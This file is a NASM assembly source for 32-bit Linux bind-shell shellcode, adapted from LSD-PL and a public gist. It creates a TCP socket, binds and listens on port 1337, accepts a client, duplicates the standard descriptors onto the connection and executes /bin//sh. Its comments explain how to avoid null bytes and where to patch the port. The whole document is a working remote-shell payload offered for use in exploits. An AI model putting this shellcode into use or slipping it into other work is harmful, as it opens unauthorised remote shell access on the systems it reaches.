; nasm -f bin bindsckcode.asm
; adopted from http://lsd-pl.net/projects/asmcodes.zip  bindsckcode.asm 

;open listener, bind stdin, stdout, stderr to connected sock

;syscall     eax ebx,ecx,edx
;----------- ---- ---------------------------------------------------------------
;socketcall  x066 socket=1,->[AF_INET=2,SOCK_STREAM=2,prot=0]
;socketcall  x066 bind=2,->[sfd,->sadr=[0xff,2,hi,lo,0,0,0,0],len=0x10]
;socketcall  x066 listen=4,->[sfd,backlog=102]
;socketcall  x066 accept=5,->[sfd,0,0]
;dup2        x03f sfd,fd={2,1,0}

USE32
global _start:

_start:
SYS_SOCKETCALL equ 0x66
SYS_BIND equ 2
SYS_LISTEN equ 4
SYS_ACCEPT equ 5
SYS_SOCKET equ 1
AF_INET equ 2
SOCK_STREAM equ 1
SYS_DUP2 equ 0x3f
SYS_EXECVE equ 0xb

BINDSCKPORTOFS equ 06   ;offset into shellcode at which to insert port number
                        ;to bind to *((short*)(sc+6)) = sa.sin_port

bindsckcode:
   xor     eax,eax
   push    eax          ;sin_addr

;replace 3905 below wih desired port number. remember byte order!
   push    0x3905ffff   ;sin_family sin_port(1337) (fff2 changed to 0002)
;    add     word [esp], 0x2
;   sub     word [esp+2], 0x1  ;This was added to change fff2 to 0002 to avoid nulls
   dec     esp
   dec     esp
   inc     eax
   inc     eax 
   push    ax
   xor     eax, eax
   mov     edi,esp      ;sockaddr_in*
   push    eax          ;protocol
   push    byte SOCK_STREAM   ;type
   push    byte AF_INET       ;family
   mov     ecx,esp            ;parms*
   mov     al,SYS_SOCKETCALL
   xor     ebx,ebx
   inc     ebx          ;sys_socket
   int     0x80
   push    byte 0x10    ;sizeof(sockaddr)
   push    edi          ;sockaddr_in*
   push    eax          ;socket
   mov     ecx,esp      ;parms*
   mov     al,SYS_SOCKETCALL
   inc     ebx          ;sys_bind
   int     0x80         
   mov     al,SYS_SOCKETCALL
   mov     bl,4         ;sys_listen
   mov     [esp+4],eax  ;backlog
   int     0x80
   xor     eax,eax
   add     esp, byte 0x0c
   push    eax          ;&len=NULL
   push    eax          ;&sockaddr_in=NULL
   mov     al,SYS_SOCKETCALL
   inc     ebx          ;sys_accept
   int     0x80
   mov     ebx,eax      ;ebx=client_sock
   xor     ecx,ecx
   mov     cl,3
dup_loop:
   xor     eax,eax
   mov     al,SYS_DUP2
   dec     ecx
   int     0x80
   inc     ecx
   loop    dup_loop
;at this point we have a connected client dup'ed onto 0,1,2
;All that is left to do is shovel a shell
;code from https://gist.github.com/geyslan/5174296
   mov eax, 11          ;execve syscall#
   push 0		;null byte terminator
   push 0x68732f2f      ;"//sh"
   push 0x6e69622f	;"/bin"
   mov ebx, esp		;ptr to "/bin//sh" string
   lea ecx, [esp+8]	;null ptr to argv
   lea edx, [esp+8]	;null ptr to envp
   int 0x80
